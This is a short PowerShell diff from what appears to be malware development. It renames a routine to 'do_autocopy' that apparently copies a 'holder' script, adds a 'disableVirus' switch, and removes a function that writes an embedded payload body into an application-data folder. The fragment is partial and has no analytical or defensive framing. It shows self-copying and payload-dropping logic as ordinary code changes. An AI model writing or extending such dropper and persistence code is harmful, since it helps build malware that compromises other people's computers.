@@ -28,8 +28,12 @@ function GlobalScriptData {
     return $data
 }
 
-function DoHolder_AppData {
+function do_autocopy {
     
+    if ($server.disableVirus)
+    {
+        return
+    }
     function Is-HolderScript { param ([string]$curPath)
 
         $holderPath = Get-HolderPath
@@ -78,20 +82,5 @@ function DoHolder_AppData {
     
     } catch {
         writedbg "Error DoAuto"
-    }
-}
-
-
-function DoBody_InitialExtract()
-{
-    $appDataFolder = Get-HephaestusFolder
-    if (-not (Test-Path -Path $appDataFolder))
-    {
-        New-Item -Path $appDataFolder -ItemType Directory | Out-Null
-    }
-    $holderBodyFile = Get-BodyPath
-    if (-not (Test-Path -Path $holderBodyFile))
-    {
-        ExtractEmbedding -inContent $xbody -outFile $holderBodyFile
     }
 }
